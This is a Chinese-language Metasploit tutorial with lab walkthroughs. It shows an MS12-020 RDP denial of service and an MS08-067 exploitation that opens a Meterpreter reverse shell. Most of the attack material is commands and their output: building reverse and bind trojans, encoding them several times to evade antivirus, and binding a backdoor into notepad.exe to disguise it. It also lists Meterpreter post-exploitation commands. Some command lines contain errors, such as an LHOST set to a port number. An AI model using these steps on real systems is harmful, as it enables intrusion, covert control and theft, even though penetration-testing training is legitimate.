# metasploit 使用教程

# METASPLOIT基础入门

### 1、基础知识

------

#### 1.1 简介

Metasploit是一款开源安全漏洞检测工具，附带数百个已知的软件漏洞，并保持频繁更新。被安全社区冠以“可以黑掉整个宇宙”之名的强大渗透测试框架。 

Metasploit Framework最初是 HD Moore  个人的想法，当时他在一家安全公司工作，他于2003年10月发布了第一个基于Perl的Metasploit版本，一开始只有共11个漏洞利用程序。后来随着Spoonm帮助和加入，HD发布于2004年4月重写了该项目并发布了Metasploit2.0。此版本包括19个漏洞和超过27个payload。在这个版本之发布后不久，马特米勒（Skape）加入了Metasploit的开发团队，使得该项目日益流行，Metasploit Framework也收到来自信息安全界的大力支持，并迅速成为一个渗透测试必备的工具。 

在2004年8月HD Moore 和 Spoonm 等4名年轻人在black  hat会议上首次公布了该项目，Metasploit的团队在2007年使用Ruby编程语言完全重写并发布了Metasploit3.0，这次Metasploit从Perl到Ruby的迁移历时18个月，增加超过15万行的新代码。随着3.0版本的发布，Metasploit开始被广泛的采用，在整个安全社区也受到了大幅增加的帮助和贡献。 请输入图片描述 

在2009年秋季，Rapid7收购了Metasploit，Rapid7是一个在漏洞扫描领域的领导者公司，被收购之后，Rapid7公司允许HD建立一个团队，仅仅着重于Metasploit Framework的开发。也正由于这样，这次收购使得Metasploit Framework开始更迅速地发展。HD  Moore也成为了Rapid7公司的CSO（Chief Security Officer），同时他也是Metasploit的首席架构师。 

#### 1.2 专业术语

渗透攻击（Exploit）,指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。 

攻击载荷（Payload），是我们期望目标系统在被渗透攻击之后去执行的代码。 

Shellcode，是在渗透攻击是作为攻击载荷运行的一组机器指令，通常用汇编语言编写。 

模块（Module），指Metasploit框架中所使用的一段软件代码组件，可用于发起渗透攻击或执行某些辅助攻击动作。 

监听器（Listener），是Metasploit中用来等待网络连接的组件。 

#### 1.3 用户接口

终端（Msfconsole），是Metasploit框架最受欢迎的用户接口，提供与用户交互式的输入，可以用它来做任何事情。 启动终端：在命令行里输入msfencode即可。 

```
light@kali:~# msfconsole
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'
 
I love shells --egypt
 
 
Tired of typing 'set RHOSTS'? Click & pwn with Metasploit Pro
Learn more on http://rapid7.com/metasploit
 
       =[ metasploit v4.10.0-2014082101 [core:4.10.0.pre.2014082101 api:1.0.0]]
+ -- --=[ 1331 exploits - 722 auxiliary - 214 post        ]
+ -- --=[ 340 payloads - 35 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]
 
msf >
```

命令行（msfcli），msfcli脚本处理和其他命令工具的互操作性。 Armitage，Metasploit框架中一个完全交互式的图形化用户接口。 

#### 1.4 功能程序

MSF攻击载荷生成器（msfpayload），用于生成自己定制的shellcode、可执行代码等。 

MSF编码器（msfencode），帮助msfpayload进行编码处理，避免坏字符，以及逃避杀毒软件和IDS的检测。 

### 2、Metasploit实验

------

#### 2.1 MS12-020漏洞利用演示实验

2.1.1 微软关于MS12-020漏洞的安全公告: [ http://technet.microsoft.com/zh-cn/security/bulletin/ms12-020](http://technet.microsoft.com/zh-cn/security/bulletin/ms12-020) 

2.1.2 实验准备工作 

1、该漏洞利用远程桌面的漏洞进行攻击，所以需要靶机xp系统打开远程桌面功能。 

2、检查确定渗透测试系统与靶机系统可以互相ping通。 

2.1.3 实验步骤 1、渗透测试系统中，在终端输入msfconsole进入msf终端，接着在msf终端中使用search功能搜索ms12-020，发现有两个可用模块： 

```
msf > search ms12-020
 
Matching Modules
================
   Name                                              Disclosure Date  Rank    Description
   ----                                              ---------------  ----    -----------
   auxiliary/dos/windows/rdp/ms12_020_maxchannelids  2012-03-16       normal  MS12-020 Microsoft Remote Desktop Use-After-Free DoS
   auxiliary/scanner/rdp/ms12_020_check                               normal  MS12-020 Microsoft Remote Desktop Checker
```

2、使用use命令选定要利用的模块： 

```
msf > use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
msf auxiliary(ms12_020_maxchannelids) 
```

3、查看需要填写的参数，这里需要填写靶机ip。 

```
msf auxiliary(ms12_020_maxchannelids) > show options 
 
Module options (auxiliary/dos/windows/rdp/ms12_020_maxchannelids):
 
   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   RHOST                   yes       The target address
   RPORT  3389             yes       The target port
 
msf auxiliary(ms12_020_maxchannelids) > set RHOST 192.168.116.129
RHOST => 192.168.116.129
```

4、最后输入命令“run”，执行我们的auxiliary攻击模块： 

```
msf auxiliary(ms12_020_maxchannelids) > run
 
[*] 192.168.116.129:3389 - Sending MS12-020 Microsoft Remote Desktop Use-After-Free DoS
[*] 192.168.116.129:3389 - 210 bytes sent
[*] 192.168.116.129:3389 - Checking RDP status...
[+] 192.168.116.129:3389 seems down
[*] Auxiliary module execution completed
```

5、靶机系统受到攻击后蓝屏 

[![img](http://wiki.wooyun.org/_media/tools:p5.png?w=300&tok=9da908)](http://wiki.wooyun.org/_detail/tools:p5.png?id=tools%3Ametasploit) 

#### 2.2 MS08-067漏洞利用演示实验

2.2.1 微软关于MS18-067漏洞的安全公告: 

http://technet.microsoft.com/zh-cn/security/bulletin/ms08-067 

2.2.2 实验步骤 

1、进入msf终端后，使用search功能搜索ms08-067，发现有一个可用模块： 

```
msf > search ms08-067
 
Matching Modules
================
 
   Name                                 Disclosure Date  Rank   Description
   ----                                 ---------------  ----   -----------
   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  MS08-067 Microsoft Server Service Relative Path Stack Corruption
```

2、使用use命令选定要利用的模块： 

```
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) >
```

3、接下来，light教授设置攻击载荷为基于Windows系统的Meterpreter reverse_tcp  ，这个载荷在攻击之后，会从目标主机发起一个反弹连接，连接到LHOST中指定的IP地址（也就是我们俗称的反弹马）。这种反弹连接可以让你绕过防火墙的入站流量保护，或者穿透NAT网关。 

```
msf exploit(ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
```

4、使用“show targets”命令让我们识别和匹配目标操作系统的类型。（大多数MSF渗透攻击模块会自动对目标系统类型进行识别，而不需要手工指定此参数，但是针对MS08-067漏洞的攻击中，通常无法正确的自动识别出系统类型。） 

```
msf exploit(ms08_067_netapi) > show targets 
 
Exploit targets:
 
   Id  Name
   --  ----
   0   Automatic Targeting
   1   Windows 2000 Universal
   2   Windows XP SP0/SP1 Universal
   3   Windows XP SP2 English (AlwaysOn NX)
   4   Windows XP SP2 English (NX)
   5   Windows XP SP3 English (AlwaysOn NX)
   6   Windows XP SP3 English (NX)
   7   Windows 2003 SP0 Universal
   8   Windows 2003 SP1 English (NO NX)
   9   Windows 2003 SP1 English (NX)
   10  Windows 2003 SP1 Japanese (NO NX)
   11  Windows 2003 SP2 English (NO NX)
   12  Windows 2003 SP2 English (NX)
   13  Windows 2003 SP2 German (NO NX)
   14  Windows 2003 SP2 German (NX)
   15  Windows XP SP2 Arabic (NX)
   16  Windows XP SP2 Chinese - Traditional / Taiwan (NX)
   17  Windows XP SP2 Chinese - Simplified (NX)
   ......
```

5、选定系统编号（TARTGET），设置靶机IP（RHOST）与本机IP（LHOST） 

```
msf exploit(ms08_067_netapi) > set TARGET 17
TARGET => 17
msf exploit(ms08_067_netapi) > set RHOST 192.168.116.129
RHOST => 192.168.116.129
msf exploit(ms08_067_netapi) > set LHOST 192.168.116.128
LHOST => 192.168.116.128
```

6、使用“show options”命令查看当前参数设置情况： 

```
msf exploit(ms08_067_netapi) > show options 
 
Module options (exploit/windows/smb/ms08_067_netapi):
 
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.116.129  yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
 
 
Payload options (windows/meterpreter/reverse_tcp):
 
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (accepted: seh, thread, process, none)
   LHOST     192.168.116.128  yes       The listen address
   LPORT     4444             yes       The listen port
 
 
Exploit target:
 
   Id  Name
   --  ----
   17  Windows XP SP2 Chinese - Simplified (NX)
```

7、参数检查无误后，输入“exploit”对靶机进行攻击。当返回meterpreter提示符表示利用成功。 

```
msf exploit(ms08_067_netapi) > run
 
[*] Started reverse handler on 192.168.116.128:4444 
[*] Attempting to trigger the vulnerability...
[*] Sending stage (769536 bytes) to 192.168.116.129
[*] Meterpreter session 1 opened (192.168.116.128:4444 -> 192.168.116.129:1036) at 2015-06-01 03:10:26 -0400
```

8、可以利用vnc对靶机进行图形化远程控制，命令：run vnc 。Meterpreter还有很多强大的功能，我们将在后续的章节详细介绍。 

### 3、Meterpreter

------

#### 3.1 简介

Metasploitv4之后的新版本中，Meterpreter作为后渗透攻击模块的实施通道，可以根据渗透测试目标需求进行灵活扩展。 

涉及范围： 信息搜集、口令攫取、权限提升、内网拓展等。 

#### 3.2 Meterpreter技术优势

1、平台通用性 提供了各种主流操作系统和平台上的meterpreter版本，包括windows、linux、BSD，并同时支持x86和x64平台。另外还提供基于java和php语言的实现，以应对各种不同环境。 

2、纯内存工作模式 工作时直接装载meterpreter的动态链接库到目标进程空间，而不是先上传到磁盘，再调用loadlibrary加载动态链接库启动。这样启动隐蔽，很难被杀毒软件检测到，也不会再目标主机磁盘留下任何痕迹。 

3、灵活且加密的通信协议 采用TLV（type length value）数据封装格式；通信数据经过XOR加密，然后调用OpenSSL库进行SSL封装传输，保证传输的保密和隐蔽性。 

4、易于扩展 Meterpreter的插件以动态链接库文件的形式存在，可以选择你喜欢的编程语言按照Meterpreter的接口形式编写你需要的功能，然后编译成动态链接库，拷贝至相应目录即可。 

#### 3.3 Meterpreter常用命令

1、基本命令（包含meterpreter和msf终端、ruby接口、目标shell交互的命令） 

```
background（进程隐藏至后台）

sessions（查看已经成功获取的会话，-i 恢复会话）

quit（关闭当前会话）

shell （获取系统控制台shell，如果目标系统命令行可执行程序不存在或禁止访问， 则shell命令会出错）

irb（与Ruby终端交互，调用metasploit封装好的函数；在irb中还可以添加metasploit附加组件railgun，直接与windows本地API进行交互）
```

2、文件系统命令（与目标文件系统交互，包括查看、上传下载、搜索、编辑） 

```
cat（目标系统文件交互）

getwd（获取目标机当前工作目录,getlwd本地当前工作工作目录）

upload（上传文件或文件夹到目标机 -r 递归）

download（从目标机下载文件或文件夹 -r 递归）

edit（调用vi编辑器，对目标上的文件进行编辑）

search（对目标机的文件进行搜索）
```

3、网络命令（查看目标网络状况、连接信息，进行端口转发等） 

```
ipconfig（获取目标主机上的网络接口信息）

portfwd（端口转发：将目标主机开放但不允许访问的端口进行转发）

route（显示目标主机路由信息）
```

4、系统命令（查看目标系统信息、对系统进行基本操作等） 

```
ps（查看目标机正在运行的进程信息）

migrate（将meterpreter会话进程迁移到另一个进程内存空间）

execute（在目标机上执行文件）

getpid（当前会话所在进程的pid值）

kill（终结指定的pid程序）

getuid（获取当前会话用户名）

sysinfo（获取系统信息）

shutdown（关闭目标主机）
```

5、用户接口命令 

```
screenshot（截获被控主机当前桌面）
```

#### 3.4 后渗透模块

MetasploitV4.0正式引入后渗透模块，其格式与渗透攻击模块相统一，位于post/ 目录下，用于实现特殊或定制的功能。 

Meterpreter在渗透测试中的范围： 

范围包括：权限提升、信息窃取、口令攫取和利用、内网拓展、掩踪灭迹、维持访问。 

### 4、攻击载荷（Msfpayload）

------

#### 4.1 简介

攻击载荷（msfpayload）是我们期望目标系统在被渗透攻击后去执行的代码，在metasploit框架中可以自由的选择、传送和植入。 

使用命令“msfpayload -l”可以查看攻击载荷列表： 

```
light@kali:~# msfpayload -l
 
Framework Payloads (340 total)
==============================
 
    Name                                             Description
    ----                                             -----------
    aix/ppc/shell_bind_tcp                           Listen for a connection and spawn a command shell
    aix/ppc/shell_find_port                          Spawn a shell on an established connection
    aix/ppc/shell_interact                           Simply execve /bin/sh (for inetd programs)
    aix/ppc/shell_reverse_tcp                        Connect back to attacker and spawn a command shell
    android/meterpreter/reverse_http                 Run a meterpreter server on Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                Run a meterpreter server on Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                  Run a meterpreter server on Android. Connect back stager
    android/shell/reverse_http                       Spawn a piped command shell (sh). Tunnel communication over HTTP
    android/shell/reverse_https                      Spawn a piped command shell (sh). Tunnel communication over HTTPS
    android/shell/reverse_tcp                        Spawn a piped command shell (sh). Connect back stager
    bsd/sparc/shell_bind_tcp                         Listen for a connection and spawn a command shell
    bsd/sparc/shell_reverse_tcp                      Connect back to attacker and spawn a command shell
    bsd/x86/exec                                     Execute an arbitrary command
    bsd/x86/metsvc_bind_tcp                          Stub payload for interacting with a Meterpreter Service
    bsd/x86/metsvc_reverse_tcp                       Stub payload for interacting with a Meterpreter Service
    bsd/x86/shell/bind_ipv6_tcp                      Spawn a command shell (staged). Listen for a connection over IPv6
    bsd/x86/shell/bind_tcp                           Spawn a command shell (staged). Listen for a connection
    bsd/x86/shell/find_tag                           Spawn a command shell (staged). Use an established connection
    bsd/x86/shell/reverse_ipv6_tcp                   Spawn a command shell (staged). Connect back to the attacker over IPv6
    bsd/x86/shell/reverse_tcp                        Spawn a command shell (staged). Connect back to the attacker
    bsd/x86/shell_bind_tcp                           Listen for a connection and spawn a command shell
    bsd/x86/shell_bind_tcp_ipv6                      Listen for a connection and spawn a command shell over IPv6
    bsd/x86/shell_find_port                          Spawn a shell on an established connection
    bsd/x86/shell_find_tag                           Spawn a shell on an established connection (proxy/nat safe)
    bsd/x86/shell_reverse_tcp                        Connect back to attacker and spawn a command shell
    bsd/x86/shell_reverse_tcp_ipv6                   Connect back to attacker and spawn a command shell over IPv6
    ....
 
```

#### 4.2 利用msfpayload生成meterpreter反弹木马实验

1、下面我们利用msfpayload生成一个windows下运行的反弹meterpreter木马，命令为: 

```
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.116.128 LPORT=10086 X > Desktop/muma01.exe
light@kali:~# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.116.128 LPORT=10086 X > Desktop/muma01.exe
Created by msfpayload (http://www.metasploit.com).
Payload: windows/meterpreter/reverse_tcp
 Length: 287
Options: {"LHOST"=>"192.168.116.128", "LPORT"=>"10086"}
```

参数解释：msfpayload后面跟生成木马所选用的攻击载荷，后面在加上攻击载荷所需要的参数（上例中需要设置的是本地系统的IP与端口），“X”表示生成可执行文件，“>”号后面跟自定义的生成文件的路径与文件名。 

2、可以检查一下文件属性，看到是有效的windows可执行程序： 

```
light@kali:~# file Desktop/muma01.exe 
Desktop/muma01.exe: PE32 executable (GUI) Intel 80386, for MS Windows
```

3、在本地渗透测试系统中进入msfconsole并开启监听： 

```
use exploit/multi/handler
```

，然后指定要监听的的攻击载荷类型： 

```
set PAYLOAD windows/meterpreter/reverse_tcp
```

，最后设置好对应的参数，开启监听。 

```
msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.116.128
LHOST => 192.168.116.128
msf exploit(handler) > set LHOST 10086
LHOST => 10086
msf exploit(handler) > exploit 
 
[*] Started reverse handler on 192.168.116.128:10086
[*] Starting the payload handler...
```

4、在我们的windows靶机下打开刚才由msfpayload生成的木马文件。 

5、在渗透测试系统的msfconsole中看到反弹马已经成功返回meterpreter，实验成功！ 

```
msf exploit(handler) > exploit
 
[*] Started reverse handler on 192.168.116.128:10086 
[*] Starting the payload handler...
[*] Sending stage (769536 bytes) to 192.168.116.129
[*] Meterpreter session 1 opened (192.168.116.128:10086 -> 192.168.116.129:1036) at 2015-06-01 03:10:26 -0400
 
meterpreter >
```

#### 4.3 直连型木马（bind_tcp）生成实验

实验之前我们先用一张图简单展示一下反弹型与直连型木马的区别。 

[![请输入图片描述](http://wiki.wooyun.org/_media/tools:p15_1_.png)](http://wiki.wooyun.org/_detail/tools:p15_1_.png?id=tools%3Ametasploit) 

1、使用msfpayload生成一个windows下运行的直连型meterpreter木马，命令： 

```
msfpayload windows/meterpreter/bind_tcp RHOST=192.168.198.224 LPORT=10086 X > Desktop/muma02.exe
```

因为是直连，所以参数里的IP是靶机IP（RHOST），这里要注意区分。 

```
light@kali:~# msfpayload windows/meterpreter/bind_tcp RHOST=192.168.198.224 LPORT=10086 X > Desktop/muma02.exe
Created by msfpayload (http://www.metasploit.com).
Payload: windows/meterpreter/bind_tcp
 Length: 295
Options: {"RHOST"=>"192.168.198.224", "LPORT"=>"10086"}
```

2、设置监听（注意参数） 

```
msf > use exploit/multi/handler 
msf exploit(handler) > set PAYLOAD windows/meterpreter/bind_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.116.128
LHOST => 192.168.116.128
msf exploit(handler) > set LHOST 10086
LHOST => 10086
msf exploit(handler) > exploit 
 
[*] Starting the payload handler...
[*] Started bind handler
```

3、靶机运行木马后，攻击端成功连接。 

```
[*] Starting the payload handler...
[*] Started bind handler 
[*] Sending stage (769536 bytes) to 192.168.116.129
[*] Meterpreter session 1 opened (192.168.116.128:10086 -> 192.168.116.129:1036) at 2015-06-01 03:10:26 -0400
 
meterpreter >
```

### 5、MSF编码（Msfencode）

------

#### 5.1 简介

Msf编码器是一个非常实用的工具，它能够改变可执行文件中的代码形状，让杀毒软件认不出它原来的样子，而程序的功能不会受到任何影响。和电子邮件附件使用Base64重新编码类似，msf编码器将原始的可执行程序重新编码，并生成一个新的二进制文件。当这个文件运行后，msf编码器会将原始程序解码到内存中并执行。 

使用命令“msfencode -h”可以查看msfencode参数说明，“msfencode -l”可以查看msf编码器列表。 

```
light@kali:~# msfencode -l
 
Framework Encoders
==================
 
    Name                          Rank       Description
    ----                          ----       -----------
    cmd/generic_sh                good       Generic Shell Variable Substitution Command Encoder
    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
    cmd/powershell_base64         excellent  Powershell Base64 Command Encoder
    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
    generic/eicar                 manual     The EICAR Encoder
    generic/none                  normal     The "none" Encoder
    mipsbe/byte_xori              normal     Byte XORi Encoder
    mipsbe/longxor                normal     XOR Encoder
    mipsle/byte_xori              normal     Byte XORi Encoder
    mipsle/longxor                normal     XOR Encoder
    php/base64                    great      PHP Base64 Encoder
    ppc/longxor                   normal     PPC LongXOR Encoder
    ppc/longxor_tag               normal     PPC LongXOR Encoder
    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
    x64/xor                       normal     XOR Encoder
    x86/add_sub                   manual     Add/Sub Encoder
    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
    x86/countdown                 normal     Single-byte XOR Countdown Encoder
    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
    x86/nonalpha                  low        Non-Alpha Encoder
    x86/nonupper                  low        Non-Upper Encoder
    x86/opt_sub                   manual     Sub Encoder (optimised)
    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
    x86/single_static_bit         manual     Single Static Bit
    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
```

#### 5.2 MSFENCODE编码实验

1、生成一个经过msfencode编码的木马文件： 

```
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.198.220 LPORT=10086 R | msfencode -e x86/shikata_ga_nai -t exe > Desktop/muma_encode.exe
```

参数解释 “R”：输出原始数据 “|” ： 分割符 “-e”：指定编码器类型 “-t”：输出文件类型 “>”：指定生成文件名（可以用“-o”参数替代） 

2、多重编码  单纯的一次msfencode编码现在已经很难绕过杀软，在掌握了上面基本的编码技巧后，我们学习一下msfencode的多重编码。  在Metasploit框架中，允许我们使用多重编码技术来对攻击载荷（msfpayload）进行多次编码，以绕过杀软的特征码检查。  生成一个经过多次msfencode编码的木马文件： 

```
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.198.220 LPORT=10086 R | msfencode -e x86/shikata_ga_nai -c 5 -t raw | msfencode -e x86/jmp_call_additive -c 3 -t raw | msfencode -e x86/call4_dword_xor -c 7 -t raw | msfencode -e x86/shikata_ga_nai -c 2 -t exe -o Desktop/muma_multiEncode.exe
```

参数解释 “-c”：使用当前编码器编码的次数 “raw”：以原始数据类型输出 “-o”：指定生成的文件名 

注意：过多次的使用msfencode混合编码虽然绕过杀软检测的效果更好，但同时也有导致木马文件无法正常运行的可能。所以建议在编码后先对所生成文件的可用性进行检查。 请输入图片描述 

3、伪装你的木马文件  大多数情况下，当被攻击的用户运行类似我们上面生成的包含后门的可执行文件时，因为什么都没有发生，这很可能会引起用户的怀疑。为了避免被目标察觉，我们可以在启动攻击载荷的同时，捆绑一个宿主程序，让木马达到伪装的效果。  这里使用windows下著名的文本编辑器notepad.exe（32位）程序作宿主程序来进行演示，notepad.exe文件可以在网上下载或者直接从windows系统的c:\windows\system32路径下拷贝出来。 

以下生成的木马文件在受攻击端打开时会启动正常的notepad文本编辑器，同时后门程序会在另一个独立进程中执行，连回攻击端。并且具备一定的免杀能力。 

```
msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.116.128 LPORT=10086 R | msfencode -e x86/shikata_ga_nai -c 5 -x Desktop/notepad.exe -k -t exe -o Desktop/muma_notepad.exe
```

请输入图片描述 捆绑宿主程序 

请输入图片描述 运行时启动宿主程序，起到伪装效果 

请输入图片描述 生成的文件具备一定免杀能力 

参数解释 “-x”： 绑定木马到制定程序 “-k”： 配置攻击载荷在独立的线程中启动 

注意 “-k”参数会配置攻击载荷在一个独立的线程中启动，这样宿主程序在执行时不会受到影响，但此参数不一定能用在所有可执行程序上，实际攻击前请确保你已经在实验环境中进行了测试。 

### 6、辅助模块（Auxiliary）

------

#### 6.1 简介

Metasploit的辅助模块主要用于信息搜集阶段，功能包括扫描、口令猜解、敏感信息嗅探、FUZZ测试发掘漏洞、实施网络协议欺骗等。这些模块可以分为Admin、Scanner、Server三个大类。 

Admin Admin HTTP Modules Admin MSSQL Modules Admin MySQL Modules Admin Postgres Modules Admin VMWare Modules 

Scanner DCERPC Discovery FTP HTTP IMAP MSSQL MySQL NetBIOS POP3 SMB SMTP SNMP SSH Telnet TFTP VMWare VNC 

Server Server Capture Modules 

#### 6.2 SYN端口扫描实例

1、进入msfconsole之后，使用auxiliary的syn扫描模块“use  auxiliary/scanner/portscan/syn”，接着检查参数情况“show options”，设置必填参数“set RHOSTS 192.168.198.110,120,221-224”，运行“run”。 

Tips：多IP参数设置方法 Nmap、Metasploit等工具经常会遇到多ip设置，其语法为：  一个ip段，使用“-”来表示，如192.168.1.20到192.168.1.35可以表示为“192.168.1.20-35”；多个不连续的ip可以用“，”分隔开，如192.168.1.55和192.168.1.66两个不连续ip可以用“192.168.1.55,66”来表示。 